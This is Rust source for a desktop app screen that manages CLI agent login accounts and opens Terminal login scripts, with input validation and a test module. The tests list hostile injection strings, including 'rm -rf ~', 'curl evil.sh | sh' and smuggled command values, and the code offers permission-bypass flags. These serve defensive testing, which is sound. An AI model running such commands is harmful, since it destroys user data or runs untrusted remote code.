//! Màn Gói agent: gói đăng ký (tài khoản CLI) worker chia run cho, đọc và ghi qua `hive-worker accounts` (spec 008
//! US13, US14). Không lệnh nào nhận hay trả token: đăng nhập là luồng của chính CLI, chạy trong Terminal.
//!
//! Lệnh đăng nhập do worker trả (`accounts add`) đi qua giao diện rồi mới tới đây, nên Rust không chạy chuỗi đó nguyên
//! văn: chỉ nhận đúng các dạng `claude auth login …` và `codex login …`, và chỉ biến chọn thư mục đăng nhập của CLI, để
//! một lỗi chèn script ở cửa sổ cũng không mở được Terminal chạy lệnh tuỳ ý. "Mở CLI" còn chặt hơn: cửa sổ chỉ gửi id
//! gói và thư mục, binary và thư mục đăng nhập do Rust đọc từ worker.

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::{SystemTime, UNIX_EPOCH};

use serde::Deserialize;
use tauri::AppHandle;

use crate::sidecar_json;

const ROLES: [&str; 3] = ["plan", "implement", "review"];

/// Cách đăng nhập của từng CLI, như hộp thoại Thêm gói và `accounts add --how`.
fn login_ways(cli: &str) -> Option<&'static [&'static str]> {
    match cli {
        "claude" => Some(&["plan", "sso", "console"]),
        "codex" => Some(&["browser", "device"]),
        _ => None,
    }
}

/// Biến trỏ CLI sang thư mục đăng nhập của gói (cùng bảng với worker/internal/accounts).
fn config_env(cli: &str) -> Option<&'static str> {
    match cli {
        "claude" => Some("CLAUDE_CONFIG_DIR"),
        "codex" => Some("CODEX_HOME"),
        _ => None,
    }
}

/// Email đi vào lệnh đăng nhập trong script: chỉ nhận ký tự không cần trích dẫn ở cả sh lẫn cmd.
fn valid_email(email: &str) -> bool {
    let Some((user, domain)) = email.split_once('@') else {
        return false;
    };
    let ok = |s: &str, extra: &str| {
        !s.is_empty()
            && s.chars()
                .all(|c| c.is_ascii_alphanumeric() || extra.contains(c))
    };
    email.len() <= 254 && ok(user, "._+-") && ok(domain, ".-") && domain.contains('.')
}

fn arg(key: &str, value: impl std::fmt::Display) -> String {
    // `--key=value` để giá trị bắt đầu bằng `-` (tên gói) không bị đọc thành cờ.
    format!("--{key}={value}")
}

fn add_args(
    cli: &str,
    label: &str,
    how: Option<&str>,
    email: Option<&str>,
) -> Result<Vec<String>, String> {
    let ways = login_ways(cli).ok_or("Chỉ thêm được gói Claude Code hoặc Codex.")?;
    let label = label.trim();
    if label.is_empty() {
        return Err("Nhập tên hiển thị của gói.".into());
    }
    let mut args = vec![
        "accounts".into(),
        "add".into(),
        arg("cli", cli),
        arg("label", label),
    ];
    if let Some(how) = how {
        if !ways.contains(&how) {
            return Err(format!("Cách đăng nhập {how} không dùng được cho {cli}."));
        }
        args.push(arg("how", how));
    }
    if let Some(email) = email.map(str::trim).filter(|e| !e.is_empty()) {
        if cli != "claude" {
            return Err("Chỉ Claude Code nhận email khi đăng nhập.".into());
        }
        if !valid_email(email) {
            return Err(format!("Email {email} không hợp lệ."));
        }
        args.push(arg("email", email));
    }
    args.push("--json".into());
    Ok(args)
}

/// Phần sửa của một gói; trường bỏ trống giữ nguyên. Worker kiểm khoảng giá trị và báo lỗi tiếng Việt.
#[derive(Deserialize, Default, Debug)]
#[serde(rename_all = "camelCase")]
pub struct PlanPatch {
    label: Option<String>,
    priority: Option<u32>,
    max_concurrent: Option<u32>,
    cooldown_minutes: Option<u32>,
    stop_at_session: Option<u32>,
    stop_at_week: Option<u32>,
    timeout_minutes: Option<u32>,
    roles: Option<Vec<String>>,
}

fn id_arg(id: &str) -> Result<String, String> {
    let id = id.trim();
    if id.is_empty() || id.chars().any(char::is_control) {
        return Err("Thiếu id của gói.".into());
    }
    Ok(arg("id", id))
}

fn update_args(id: &str, p: &PlanPatch) -> Result<Vec<String>, String> {
    let mut args = vec!["accounts".into(), "update".into(), id_arg(id)?];
    if let Some(label) = p.label.as_deref().map(str::trim) {
        if label.is_empty() {
            return Err("Nhập tên của gói.".into());
        }
        args.push(arg("label", label));
    }
    for (key, value) in [
        ("priority", p.priority),
        ("max-concurrent", p.max_concurrent),
        ("cooldown-minutes", p.cooldown_minutes),
        ("stop-at-session", p.stop_at_session),
        ("stop-at-week", p.stop_at_week),
        ("timeout-minutes", p.timeout_minutes),
    ] {
        if let Some(v) = value {
            args.push(arg(key, v));
        }
    }
    if let Some(roles) = &p.roles {
        if roles.is_empty() {
            return Err("Chọn ít nhất một vai trò.".into());
        }
        if let Some(bad) = roles.iter().find(|r| !ROLES.contains(&r.as_str())) {
            return Err(format!("Vai trò {bad} không có."));
        }
        args.push(arg("roles", roles.join(",")));
    }
    args.push("--json".into());
    Ok(args)
}

fn id_command(action: &str, id: &str) -> Result<Vec<String>, String> {
    Ok(vec![
        "accounts".into(),
        action.into(),
        id_arg(id)?,
        "--json".into(),
    ])
}

fn usage_args(id: Option<&str>) -> Result<Vec<String>, String> {
    let mut args = vec!["accounts".into(), "usage".into()];
    if let Some(id) = id {
        args.push(id_arg(id)?);
    }
    args.push("--json".into());
    Ok(args)
}

/// CLI mà `accounts discover` tìm được; Antigravity chỉ vào danh sách bằng đường này vì không có luồng đăng nhập trong app.
const DISCOVER_CLIS: [&str; 3] = ["claude", "codex", "antigravity"];

fn discover_args() -> Vec<String> {
    vec!["accounts".into(), "discover".into(), "--json".into()]
}

/// Thêm một đăng nhập từ kết quả tìm: `--add=<thư mục>` hoặc `--add=default:<cli>` khi CLI dùng thư mục mặc định.
fn discover_add_args(
    cli: &str,
    config_dir: Option<&str>,
    label: Option<&str>,
) -> Result<Vec<String>, String> {
    if !DISCOVER_CLIS.contains(&cli) {
        return Err(format!("CLI {cli} không có trong danh sách tìm gói."));
    }
    let target = match config_dir.map(str::trim).filter(|d| !d.is_empty()) {
        Some(dir) if dir.len() > 1024 || dir.chars().any(char::is_control) => {
            return Err("Đường dẫn thư mục đăng nhập không hợp lệ.".into());
        }
        Some(dir) => dir.to_string(),
        None => format!("default:{cli}"),
    };
    let mut args = vec!["accounts".into(), "discover".into(), arg("add", target)];
    if let Some(label) = label.map(str::trim).filter(|l| !l.is_empty()) {
        args.push(arg("label", label));
    }
    args.push("--json".into());
    Ok(args)
}

/// Tài khoản CLI của máy (accounts.json của worker, spec 008 US13), kèm trạng thái đăng nhập và quota. Không chứa token.
#[tauri::command]
pub async fn cli_profiles(app: AppHandle) -> Result<serde_json::Value, String> {
    sidecar_json(&app, vec!["accounts".into(), "--json".into()], vec![]).await
}

/// Bật hoặc tắt một tài khoản CLI; worker đọc lại file ở run sau, không cần khởi động lại.
#[tauri::command]
pub async fn cli_profile_set(
    app: AppHandle,
    id: String,
    enabled: bool,
) -> Result<serde_json::Value, String> {
    sidecar_json(
        &app,
        vec![
            "accounts".into(),
            "set".into(),
            "--id".into(),
            id,
            "--enabled".into(),
            enabled.to_string(),
            "--json".into(),
        ],
        vec![],
    )
    .await
}

/// Thêm gói: worker tạo id và thư mục đăng nhập, trả lệnh đăng nhập và biến môi trường để mở Terminal.
#[tauri::command]
pub async fn cli_profile_add(
    app: AppHandle,
    cli: String,
    label: String,
    how: Option<String>,
    email: Option<String>,
) -> Result<serde_json::Value, String> {
    let args = add_args(&cli, &label, how.as_deref(), email.as_deref())?;
    sidecar_json(&app, args, vec![]).await
}

#[tauri::command]
pub async fn cli_profile_update(
    app: AppHandle,
    id: String,
    patch: PlanPatch,
) -> Result<serde_json::Value, String> {
    sidecar_json(&app, update_args(&id, &patch)?, vec![]).await
}

/// Xoá gói khỏi danh sách; thư mục đăng nhập của CLI giữ nguyên.
#[tauri::command]
pub async fn cli_profile_remove(app: AppHandle, id: String) -> Result<serde_json::Value, String> {
    sidecar_json(&app, id_command("remove", &id)?, vec![]).await
}

/// Đọc lại quota ngay (một gói hoặc mọi gói đang bật) thay vì chờ lượt đọc 10 phút của worker.
#[tauri::command]
pub async fn cli_profile_usage(
    app: AppHandle,
    id: Option<String>,
) -> Result<serde_json::Value, String> {
    sidecar_json(&app, usage_args(id.as_deref())?, vec![]).await
}

/// Dùng tiếp: bỏ nghỉ và tạm bỏ ngưỡng dừng tới lần reset kế tiếp.
#[tauri::command]
pub async fn cli_profile_resume(app: AppHandle, id: String) -> Result<serde_json::Value, String> {
    sidecar_json(&app, id_command("resume", &id)?, vec![]).await
}

/// Đăng nhập CLI có trên máy mà danh sách gói chưa có. Worker cũ chưa có lệnh này thì trả lỗi; màn bỏ qua im lặng.
#[tauri::command]
pub async fn cli_profile_discover(app: AppHandle) -> Result<serde_json::Value, String> {
    sidecar_json(&app, discover_args(), vec![]).await
}

/// Thêm một đăng nhập tìm được vào danh sách gói; trả danh sách như `cli_profiles`.
#[tauri::command]
pub async fn cli_profile_discover_add(
    app: AppHandle,
    cli: String,
    config_dir: Option<String>,
    label: Option<String>,
) -> Result<serde_json::Value, String> {
    let args = discover_add_args(&cli, config_dir.as_deref(), label.as_deref())?;
    sidecar_json(&app, args, vec![]).await
}

/// Lệnh đã kiểm để mở trong Terminal (đăng nhập hay mở CLI): CLI, tham số, biến thư mục đăng nhập và thư mục làm việc
/// (nếu có).
#[derive(Debug, PartialEq, Eq, Clone)]
struct Launch {
    argv: Vec<String>,
    env: Option<(&'static str, String)>,
    /// PATH của shell đăng nhập (doctor::user_path): Terminal chạy script bằng /bin/sh nên không thấy CLI cài qua nvm,
    /// Homebrew hay ~/.local/bin nếu thiếu dòng này.
    path: Option<String>,
    cwd: Option<String>,
    /// Dòng báo ở đầu cửa sổ; chữ cố định, không lấy từ dữ liệu ngoài vì cmd hiểu `&`, `%` trong echo.
    note: &'static str,
}

const LOGIN_NOTE: &str = "xDev Hive: đăng nhập gói agent. Xong thì quay lại app, app tự kiểm lại.";

fn unquote(s: &str) -> &str {
    for q in ['\'', '"'] {
        if let Some(inner) = s.strip_prefix(q).and_then(|r| r.strip_suffix(q)) {
            return inner;
        }
    }
    s
}

/// Đường dẫn đi vào script: không nhận ký tự mà sh hay cmd hiểu là cú pháp, để `set "K=V"` của cmd an toàn.
fn valid_dir(dir: &str) -> bool {
    !dir.trim().is_empty()
        && dir.len() <= 1024
        && !dir
            .chars()
            .any(|c| c.is_control() || "\"'`$%!^&|<>;".contains(c))
}

fn expand_home(dir: &str, home: Option<&Path>) -> Result<String, String> {
    let rest = if dir == "~" {
        Some("")
    } else {
        dir.strip_prefix("~/").or_else(|| dir.strip_prefix("~\\"))
    };
    match (rest, home) {
        (None, _) => Ok(dir.to_string()),
        (Some(rest), Some(home)) => Ok(if rest.is_empty() {
            home.to_string_lossy().into_owned()
        } else {
            home.join(rest).to_string_lossy().into_owned()
        }),
        (Some(_), None) => {
            Err("Không biết thư mục nhà của người dùng để mở thư mục đăng nhập.".into())
        }
    }
}

fn parse_login(
    command: &str,
    env: &HashMap<String, String>,
    home: Option<&Path>,
) -> Result<Launch, String> {
    let refused = || format!("Không mở Terminal cho lệnh này: {command}");
    let words: Vec<&str> = command.split_whitespace().collect();
    let (cli, rest) = match words.as_slice() {
        ["claude", "auth", "login", rest @ ..] => ("claude", rest),
        ["codex", "login", rest @ ..] => ("codex", rest),
        _ => return Err(refused()),
    };
    let mut argv: Vec<String> = words[..words.len() - rest.len()]
        .iter()
        .map(|w| w.to_string())
        .collect();
    let mut seen: Vec<&str> = Vec::new();
    let mut i = 0;
    while i < rest.len() {
        let word = rest[i];
        let (flag, inline) = match word.split_once('=') {
            Some((f, v)) => (f, Some(v)),
            None => (word, None),
        };
        let allowed = match cli {
            "claude" => ["--console", "--sso", "--email"].contains(&flag),
            _ => flag == "--device-auth",
        };
        if !allowed || seen.contains(&flag) || (inline.is_some() && flag != "--email") {
            return Err(refused());
        }
        seen.push(flag);
        argv.push(flag.to_string());
        if flag == "--email" {
            let value = match inline {
                Some(v) => v,
                None => {
                    i += 1;
                    rest.get(i).copied().ok_or_else(refused)?
                }
            };
            let value = unquote(value);
            if !valid_email(value) {
                return Err(format!("Email {value} không hợp lệ."));
            }
            argv.push(value.to_string());
        }
        i += 1;
    }
    let var = config_env(cli).expect("CLI đã lọc ở trên");
    let mut out_env = None;
    for (key, value) in env {
        if key != var {
            return Err(format!("Không đặt biến {key} khi đăng nhập {cli}."));
        }
        out_env = dir_env(var, value, home)?;
    }
    Ok(Launch {
        argv,
        env: out_env,
        path: None,
        cwd: None,
        note: LOGIN_NOTE,
    })
}

/// Biến thư mục đăng nhập của CLI; rỗng là đăng nhập mặc định của CLI nên không đặt biến.
fn dir_env(
    var: &'static str,
    value: &str,
    home: Option<&Path>,
) -> Result<Option<(&'static str, String)>, String> {
    if value.trim().is_empty() {
        return Ok(None);
    }
    if !valid_dir(value) {
        return Err(format!("Thư mục đăng nhập không hợp lệ: {value}"));
    }
    Ok(Some((var, expand_home(value, home)?)))
}

fn sh_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', r"'\''"))
}

/// Script cho Terminal của macOS hay Linux: tự xoá, đặt thư mục đăng nhập, vào thư mục làm việc, chạy lệnh của CLI
/// trong shell đăng nhập của người dùng (PATH có CLI).
#[cfg_attr(windows, allow(dead_code))]
fn sh_script(job: &Launch) -> String {
    let mut s = String::from("#!/bin/sh\nrm -f \"$0\"\n");
    if let Some(path) = job.path.as_deref().filter(|p| !p.is_empty()) {
        s.push_str(&format!("export PATH={}\n", sh_quote(path)));
    }
    if let Some((key, value)) = &job.env {
        s.push_str(&format!("export {key}={}\n", sh_quote(value)));
    }
    if let Some(cwd) = &job.cwd {
        s.push_str(&format!("cd {} || exit 1\n", sh_quote(cwd)));
    }
    s.push_str(&format!("echo {}\n", sh_quote(job.note)));
    let argv: Vec<String> = job.argv.iter().map(|a| sh_quote(a)).collect();
    s.push_str(&argv.join(" "));
    s.push('\n');
    s
}

/// Script cho cmd của Windows. `call` vì CLI cài qua npm là file .cmd: thiếu `call` thì script dừng sau lệnh đó và
/// cửa sổ đóng trước khi người dùng đọc được kết quả.
#[cfg_attr(not(windows), allow(dead_code))]
fn cmd_script(job: &Launch) -> String {
    let mut s = String::from("@echo off\r\nchcp 65001 >nul\r\n");
    if let Some((key, value)) = &job.env {
        s.push_str(&format!("set \"{key}={value}\"\r\n"));
    }
    if let Some(cwd) = &job.cwd {
        // `/d` để đổi cả ổ đĩa.
        s.push_str(&format!("cd /d \"{cwd}\" || exit /b 1\r\n"));
    }
    s.push_str(&format!("echo {}\r\n", job.note));
    s.push_str(&format!("call {}\r\n", job.argv.join(" ")));
    s.push_str("echo.\r\npause\r\n(goto) 2>nul & del \"%~f0\"\r\n");
    s
}

fn write_script(body: &str, ext: &str) -> Result<PathBuf, String> {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or_default();
    let path =
        std::env::temp_dir().join(format!("hive-login-{}-{nanos}.{ext}", std::process::id()));
    let fail = |e: std::io::Error| format!("Không ghi được script mở Terminal: {e}");
    #[cfg(unix)]
    {
        use std::io::Write;
        use std::os::unix::fs::OpenOptionsExt;
        let mut f = std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .mode(0o700)
            .open(&path)
            .map_err(fail)?;
        f.write_all(body.as_bytes()).map_err(fail)?;
    }
    #[cfg(not(unix))]
    std::fs::write(&path, body).map_err(fail)?;
    Ok(path)
}

fn open_terminal(job: &Launch) -> Result<(), String> {
    let shown = job.argv.join(" ");
    // Đọc PATH của shell đăng nhập lúc mở (đã nhớ từ khi app khởi động), không đặt trong hàm dựng để test không phụ
    // thuộc shell của máy.
    #[cfg(unix)]
    let job = &Launch {
        path: Some(crate::doctor::user_path().to_string()),
        ..job.clone()
    };
    #[cfg(target_os = "macos")]
    {
        let script = write_script(&sh_script(job), "command")?;
        let status = Command::new("open")
            .args(["-a", "Terminal"])
            .arg(&script)
            .status()
            .map_err(|e| format!("Không mở được Terminal: {e}"))?;
        if !status.success() {
            let _ = std::fs::remove_file(&script);
            return Err(format!(
                "Không mở được Terminal. Chạy trong terminal: {shown}"
            ));
        }
        Ok(())
    }
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        let script = write_script(&cmd_script(job), "cmd")?;
        let mut cmd = Command::new("cmd");
        cmd.args(["/C", "start", ""]).arg(&script);
        // Cửa sổ của `start` hiện; cmd đứng giữa thì không.
        cmd.creation_flags(0x0800_0000);
        let status = cmd
            .status()
            .map_err(|e| format!("Không mở được cửa sổ lệnh: {e}"))?;
        if !status.success() {
            return Err(format!(
                "Không mở được cửa sổ lệnh. Chạy trong terminal: {shown}"
            ));
        }
        Ok(())
    }
    #[cfg(all(unix, not(target_os = "macos")))]
    {
        let script = write_script(&sh_script(job), "sh")?;
        for (program, flag) in [
            ("x-terminal-emulator", "-e"),
            ("gnome-terminal", "--"),
            ("konsole", "-e"),
            ("xterm", "-e"),
        ] {
            if Command::new(program).arg(flag).arg(&script).spawn().is_ok() {
                return Ok(());
            }
        }
        let _ = std::fs::remove_file(&script);
        Err(format!(
            "Không tìm thấy ứng dụng terminal (x-terminal-emulator, gnome-terminal, konsole). Chạy trong terminal: {shown}"
        ))
    }
}

/// Mở Terminal chạy lệnh đăng nhập của CLI cho một gói (Thêm gói, Đăng nhập lại). App không thấy mật khẩu hay token:
/// người dùng đăng nhập trong Terminal và trình duyệt, rồi màn Gói agent tự kiểm lại.
#[tauri::command]
pub async fn open_login_terminal(
    command: String,
    env: Option<HashMap<String, String>>,
) -> Result<(), String> {
    let login = parse_login(&command, &env.unwrap_or_default(), home_dir().as_deref())?;
    tauri::async_runtime::spawn_blocking(move || open_terminal(&login))
        .await
        .map_err(|e| e.to_string())?
}

fn home_dir() -> Option<PathBuf> {
    std::env::var_os("HOME")
        .or_else(|| std::env::var_os("USERPROFILE"))
        .map(PathBuf::from)
}

/// Phần của một gói mà "Mở CLI" cần, đọc từ `accounts --json`.
#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct Account {
    id: String,
    cli: String,
    config_dir: Option<String>,
}

#[derive(Deserialize)]
struct Accounts {
    accounts: Vec<Account>,
}

/// Binary của từng CLI mở được từ app (antigravity chạy bằng `agy`).
fn cli_binary(cli: &str) -> Option<&'static str> {
    match cli {
        "claude" => Some("claude"),
        "codex" => Some("codex"),
        "antigravity" => Some("agy"),
        _ => None,
    }
}

/// Thư mục làm việc của Terminal: phải có thật và là thư mục. Ký tự lạ bị từ chối chứ không thoát chuỗi, để cmd của
/// Windows cũng an toàn.
fn work_dir(folder: &str, home: Option<&Path>) -> Result<String, String> {
    if !valid_dir(folder) {
        return Err(format!("Thư mục làm việc không hợp lệ: {folder}"));
    }
    let dir = expand_home(folder.trim(), home)?;
    if !Path::new(&dir).is_dir() {
        return Err(format!(
            "Thư mục làm việc không có hoặc không phải thư mục: {folder}"
        ));
    }
    Ok(dir)
}

/// Cờ bỏ hỏi quyền của từng CLI khi người dùng chọn "Mở CLI (bỏ hỏi quyền)". Cố định ở đây, không nhận từ giao diện.
fn bypass_flag(cli: &str) -> Option<&'static str> {
    match cli {
        "claude" | "antigravity" => Some("--dangerously-skip-permissions"),
        "codex" => Some("--dangerously-bypass-approvals-and-sandbox"),
        _ => None,
    }
}

fn cli_launch(
    list: &[Account],
    id: &str,
    folder: Option<&str>,
    home: Option<&Path>,
    bypass: bool,
) -> Result<Launch, String> {
    let id = id.trim();
    let plan = list
        .iter()
        .find(|a| a.id == id)
        .ok_or_else(|| format!("Không có gói {id}."))?;
    let binary =
        cli_binary(&plan.cli).ok_or_else(|| format!("Chưa mở được CLI {} từ app.", plan.cli))?;
    let env = match (config_env(&plan.cli), plan.config_dir.as_deref()) {
        (Some(var), Some(dir)) => dir_env(var, dir, home)?,
        _ => None,
    };
    let cwd = folder
        .filter(|f| !f.trim().is_empty())
        .map(|f| work_dir(f, home))
        .transpose()?;
    let mut argv = vec![binary.to_string()];
    if bypass {
        argv.push(
            bypass_flag(&plan.cli)
                .ok_or_else(|| format!("CLI {} không có chế độ bỏ hỏi quyền.", plan.cli))?
                .into(),
        );
    }
    Ok(Launch {
        argv,
        env,
        path: None,
        cwd,
        note: if bypass {
            "xDev Hive: mở CLI bằng đăng nhập của gói agent, BỎ HỎI QUYỀN: CLI tự chạy lệnh và sửa file không hỏi lại."
        } else {
            "xDev Hive: mở CLI bằng đăng nhập của gói agent."
        },
    })
}

/// Mở Terminal chạy CLI của một gói, trong thư mục làm việc nếu có (menu ⋯ của màn Gói agent). Cửa sổ chỉ gửi id gói
/// và thư mục: binary và thư mục đăng nhập lấy từ worker, nên không đường dẫn hay lệnh nào đi từ giao diện vào script.
/// Gói chưa đăng nhập vẫn mở được: CLI tự đòi đăng nhập.
#[tauri::command]
pub async fn open_cli_terminal(
    app: AppHandle,
    id: String,
    folder: Option<String>,
    bypass: Option<bool>,
) -> Result<(), String> {
    let Accounts { accounts } =
        sidecar_json(&app, vec!["accounts".into(), "--json".into()], vec![]).await?;
    let job = cli_launch(
        &accounts,
        &id,
        folder.as_deref(),
        home_dir().as_deref(),
        bypass.unwrap_or(false),
    )?;
    tauri::async_runtime::spawn_blocking(move || open_terminal(&job))
        .await
        .map_err(|e| e.to_string())?
}

#[cfg(test)]
mod tests {
    use super::*;

    fn env(pairs: &[(&str, &str)]) -> HashMap<String, String> {
        pairs
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect()
    }

    #[test]
    fn add_builds_worker_flags() {
        assert_eq!(
            add_args("claude", " Duy Max ", Some("sso"), Some("duy@fpt.com")).unwrap(),
            [
                "accounts",
                "add",
                "--cli=claude",
                "--label=Duy Max",
                "--how=sso",
                "--email=duy@fpt.com",
                "--json"
            ]
        );
        assert_eq!(
            add_args("codex", "-lạ", Some("device"), Some(" ")).unwrap(),
            [
                "accounts",
                "add",
                "--cli=codex",
                "--label=-lạ",
                "--how=device",
                "--json"
            ]
        );
        assert!(add_args("gemini", "g", None, None).is_err());
        assert!(add_args("claude", "  ", None, None).is_err());
        assert!(add_args("codex", "c", Some("sso"), None).is_err());
        assert!(add_args("codex", "c", None, Some("a@b.vn")).is_err());
        assert!(add_args("claude", "c", None, Some("a b@c.vn")).is_err());
    }

    #[test]
    fn update_sends_only_given_fields() {
        let patch: PlanPatch = serde_json::from_value(serde_json::json!({
            "label": "Gói chính",
            "priority": 30,
            "maxConcurrent": 2,
            "cooldownMinutes": 60,
            "stopAtSession": 95,
            "stopAtWeek": 90,
            "timeoutMinutes": 45,
            "roles": ["plan", "review"]
        }))
        .unwrap();
        assert_eq!(
            update_args("claude-2", &patch).unwrap(),
            [
                "accounts",
                "update",
                "--id=claude-2",
                "--label=Gói chính",
                "--priority=30",
                "--max-concurrent=2",
                "--cooldown-minutes=60",
                "--stop-at-session=95",
                "--stop-at-week=90",
                "--timeout-minutes=45",
                "--roles=plan,review",
                "--json"
            ]
        );
        let only: PlanPatch = serde_json::from_value(serde_json::json!({"priority": 0})).unwrap();
        assert_eq!(
            update_args("c", &only).unwrap(),
            ["accounts", "update", "--id=c", "--priority=0", "--json"]
        );
        let none_role = PlanPatch {
            roles: Some(vec![]),
            ..Default::default()
        };
        assert!(update_args("c", &none_role).is_err());
        let bad_role = PlanPatch {
            roles: Some(vec!["plan,x".into()]),
            ..Default::default()
        };
        assert!(update_args("c", &bad_role).is_err());
        assert!(update_args(" ", &PlanPatch::default()).is_err());
    }

    #[test]
    fn discover_builds_worker_flags() {
        assert_eq!(discover_args(), ["accounts", "discover", "--json"]);
        assert_eq!(
            discover_add_args("claude", Some(" ~/.xdev-hive/accounts/claude-8 "), None).unwrap(),
            [
                "accounts",
                "discover",
                "--add=~/.xdev-hive/accounts/claude-8",
                "--json"
            ]
        );
        // Không có thư mục: đăng nhập mặc định của CLI.
        assert_eq!(
            discover_add_args("codex", None, Some(" Codex chính ")).unwrap(),
            [
                "accounts",
                "discover",
                "--add=default:codex",
                "--label=Codex chính",
                "--json"
            ]
        );
        assert_eq!(
            discover_add_args("antigravity", Some(""), None).unwrap()[2],
            "--add=default:antigravity"
        );
    }

    #[test]
    fn discover_add_refuses_unknown_input() {
        assert!(discover_add_args("gemini", None, None).is_err());
        assert!(discover_add_args("claude", Some("~/a\nb"), None).is_err());
        assert!(discover_add_args("claude", Some(&"x".repeat(1025)), None).is_err());
    }

    #[test]
    fn id_commands() {
        assert_eq!(
            id_command("remove", "codex-2").unwrap(),
            ["accounts", "remove", "--id=codex-2", "--json"]
        );
        assert_eq!(usage_args(None).unwrap(), ["accounts", "usage", "--json"]);
        assert_eq!(
            usage_args(Some("claude-1")).unwrap(),
            ["accounts", "usage", "--id=claude-1", "--json"]
        );
        assert!(id_command("resume", "").is_err());
    }

    #[test]
    fn login_accepts_only_cli_sign_in() {
        let home = Path::new("/Users/duy");
        let ok = parse_login(
            "claude auth login --sso --email duy@fpt.com",
            &env(&[("CLAUDE_CONFIG_DIR", "~/.xdev-hive/accounts/claude-2")]),
            Some(home),
        )
        .unwrap();
        assert_eq!(
            ok.argv,
            ["claude", "auth", "login", "--sso", "--email", "duy@fpt.com"]
        );
        assert_eq!(
            ok.env,
            Some((
                "CLAUDE_CONFIG_DIR",
                "/Users/duy/.xdev-hive/accounts/claude-2".into()
            ))
        );
        let codex = parse_login("codex login --device-auth", &env(&[]), None).unwrap();
        assert_eq!(codex.argv, ["codex", "login", "--device-auth"]);
        assert_eq!(codex.env, None);
        // Worker có thể trích dẫn email hay dùng dạng `--email=`.
        assert_eq!(
            parse_login("claude auth login --email='a@b.vn'", &env(&[]), None)
                .unwrap()
                .argv,
            ["claude", "auth", "login", "--email", "a@b.vn"]
        );
        // Thư mục rỗng là đăng nhập mặc định của CLI.
        assert_eq!(
            parse_login("codex login", &env(&[("CODEX_HOME", "")]), None)
                .unwrap()
                .env,
            None
        );

        for bad in [
            "claude auth login; rm -rf ~",
            "claude auth login && curl evil.sh | sh",
            "claude auth logout",
            "sh -c 'claude auth login'",
            "codex login --api-key sk-123",
            "claude auth login --sso --sso",
            "claude auth login --email",
            "claude auth login --email a@b.vn;id",
            "claude auth login --sso=1",
            "codex login --device-auth --email a@b.vn",
            "",
        ] {
            assert!(parse_login(bad, &env(&[]), None).is_err(), "{bad}");
        }
        assert!(
            parse_login("claude auth login", &env(&[("PATH", "/tmp")]), None).is_err(),
            "chỉ biến thư mục đăng nhập"
        );
        assert!(
            parse_login("codex login", &env(&[("CLAUDE_CONFIG_DIR", "/x")]), None).is_err(),
            "biến của CLI khác"
        );
        assert!(
            parse_login(
                "claude auth login",
                &env(&[("CLAUDE_CONFIG_DIR", "/x\"; rm -rf ~; \"")]),
                None
            )
            .is_err()
        );
        assert!(
            parse_login(
                "claude auth login",
                &env(&[("CLAUDE_CONFIG_DIR", "~/.claude-2")]),
                None
            )
            .is_err(),
            "~ mà không biết thư mục nhà"
        );
    }

    #[test]
    fn scripts_quote_and_set_login_folder() {
        let login = Launch {
            argv: vec![
                "claude".into(),
                "auth".into(),
                "login".into(),
                "--email".into(),
                "a@b.vn".into(),
            ],
            env: Some(("CLAUDE_CONFIG_DIR", "/Users/Duy Trần/.claude 2".into())),
            path: None,
            cwd: None,
            note: LOGIN_NOTE,
        };
        let sh = sh_script(&login);
        assert!(sh.starts_with("#!/bin/sh\nrm -f \"$0\"\n"));
        assert!(sh.contains("export CLAUDE_CONFIG_DIR='/Users/Duy Trần/.claude 2'\n"));
        assert!(sh.ends_with("'claude' 'auth' 'login' '--email' 'a@b.vn'\n"));
        assert_eq!(sh_quote("it's"), r"'it'\''s'");

        let with_path = sh_script(&Launch {
            path: Some("/opt/homebrew/bin:/Users/duy/.nvm/versions/node/v26/bin".into()),
            ..login.clone()
        });
        assert!(
            with_path.contains(
                "export PATH='/opt/homebrew/bin:/Users/duy/.nvm/versions/node/v26/bin'\n"
            ),
            "{with_path}"
        );
        let cmd = cmd_script(&Launch {
            argv: vec!["codex".into(), "login".into()],
            env: Some((
                "CODEX_HOME",
                r"C:\Users\duy\.xdev-hive\accounts\codex-2".into(),
            )),
            path: None,
            cwd: None,
            note: LOGIN_NOTE,
        });
        assert!(
            cmd.contains("set \"CODEX_HOME=C:\\Users\\duy\\.xdev-hive\\accounts\\codex-2\"\r\n")
        );
        assert!(cmd.contains("call codex login\r\n"));
        assert!(cmd.contains("pause\r\n"));
    }

    fn plans() -> Vec<Account> {
        let plan = |id: &str, cli: &str, dir: Option<&str>| Account {
            id: id.into(),
            cli: cli.into(),
            config_dir: dir.map(String::from),
        };
        vec![
            plan("claude-1", "claude", None),
            plan("claude-2", "claude", Some("~/.xdev-hive/accounts/claude-2")),
            plan("codex-2", "codex", Some("/opt/codex 2")),
            plan("antigravity-1", "antigravity", Some("/ignored")),
            plan("gemini-1", "gemini", None),
            plan("claude-9", "claude", Some("/x\"; rm -rf ~; \"")),
        ]
    }

    #[test]
    fn open_cli_uses_plan_binary_env_and_folder() {
        let home = Path::new("/Users/duy");
        let folder = env!("CARGO_MANIFEST_DIR");

        let default = cli_launch(&plans(), "claude-1", None, Some(home), false).unwrap();
        assert_eq!(default.argv, ["claude"]);
        assert_eq!((default.env, default.cwd), (None, None));

        let job = cli_launch(&plans(), " claude-2 ", Some(folder), Some(home), false).unwrap();
        assert_eq!(job.argv, ["claude"]);
        assert_eq!(
            job.env,
            Some((
                "CLAUDE_CONFIG_DIR",
                "/Users/duy/.xdev-hive/accounts/claude-2".into()
            ))
        );
        assert_eq!(job.cwd.as_deref(), Some(folder));
        let sh = sh_script(&job);
        assert!(
            sh.contains("export CLAUDE_CONFIG_DIR='/Users/duy/.xdev-hive/accounts/claude-2'\n")
        );
        assert!(sh.contains(&format!("cd '{folder}' || exit 1\n")));
        assert!(sh.ends_with("'claude'\n"));
        // Thư mục làm việc vào trước khi báo và chạy CLI.
        assert!(sh.find("cd '").unwrap() < sh.find("echo ").unwrap());
        let cmd = cmd_script(&job);
        assert!(cmd.contains(&format!("cd /d \"{folder}\" || exit /b 1\r\n")));
